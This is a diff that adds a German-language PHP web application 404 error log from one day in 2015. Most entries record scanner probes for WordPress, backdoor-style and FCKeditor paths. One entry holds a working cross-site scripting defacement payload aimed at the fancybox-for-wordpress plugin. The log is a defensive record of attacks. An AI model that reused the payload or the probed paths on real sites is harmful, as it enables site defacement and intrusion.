@@ -1,0 +1,220 @@
+2015-07-30T04:15:07+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 89.29.175.68
+HTTP_REFERER: 
+requested: array(4) {
+  ["controller"] => string(6) "https:"
+  [""] => string(19) "silber-und-blei.com"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T04:15:18+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 89.29.175.68
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(2) "js"
+  ["action"] => string(1) "'"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T04:31:35+00:00 ERR (3) 404 "hire-lasse" was not found.
+REMOTE_ADDR: 146.0.32.165
+HTTP_REFERER: 
+requested: array(5) {
+  ["lang"] => string(2) "de"
+  ["action"] => string(4) "page"
+  ["key"] => string(10) "hire-lasse"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T04:48:29+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 202.69.240.90
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(10) "wp-content"
+  ["action"] => string(13) "_input_3_.txt"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T04:51:33+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 202.69.240.90
+HTTP_REFERER: 
+requested: array(5) {
+  ["controller"] => string(10) "wp-content"
+  ["action"] => string(7) "uploads"
+  ["wysija"] => string(6) "themes"
+  ["mp"] => string(12) "autodone.php"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T04:51:34+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 202.69.240.90
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(11) "wp-includes"
+  ["action"] => string(11) "wp-head.php"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T06:03:43+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 74.208.69.84
+HTTP_REFERER: 
+requested: array(4) {
+  ["controller"] => string(6) "https:"
+  [""] => string(19) "silber-und-blei.com"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T06:03:44+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 74.208.69.84
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(2) "js"
+  ["action"] => string(1) "'"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(6) "manage"
+  ["action"] => string(9) "fckeditor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(9) "fckeditor"
+  ["action"] => string(6) "editor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(6) "editor"
+  ["action"] => string(6) "editor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(5) "admin"
+  ["action"] => string(9) "fckeditor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(7) "include"
+  ["action"] => string(9) "fckeditor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(6) "common"
+  ["action"] => string(9) "fckeditor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T11:06:12+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 192.187.126.162
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(2) "js"
+  ["action"] => string(9) "fckeditor"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T16:41:59+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 179.61.198.129
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(10) "wp-content"
+  ["action"] => string(13) "_input_3_.txt"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T17:10:41+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 179.61.198.129
+HTTP_REFERER: 
+requested: array(5) {
+  ["controller"] => string(8) "wp-admin"
+  ["action"] => string(14) "admin-ajax.php"
+  ["module"] => string(7) "default"
+  ["page"] => string(22) "fancybox-for-wordpress"
+  ["mfbfw"] => array(1) {
+    ["padding"] => string(458) "</script><script>document.title = 'Hacked by AlfabetoVirtual';</script><style>body {font-family: Times New Roman, cursive, sans-serif;background-color: #000000;color:white; text-shadow:0 0 60px black;font-size:20px;}</style><center><br /><br /><br /><br /><br /><br /><h1>Hacked by AlfabetoVirtual</h1><h2 style='color: white'>Hackeado por AlfabetoVirtual</h2>#BrazilUnderground #HackersBrasileirosUnidos #AntiGovernoBR</center><!--Hackeddddddddddddddddddddd"
+  }
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T21:28:23+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 86.126.66.213
+HTTP_REFERER: 
+requested: array(4) {
+  ["controller"] => string(6) "https:"
+  [""] => string(19) "silber-und-blei.com"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2015-07-30T21:28:23+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 86.126.66.213
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(2) "js"
+  ["action"] => string(1) "'"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
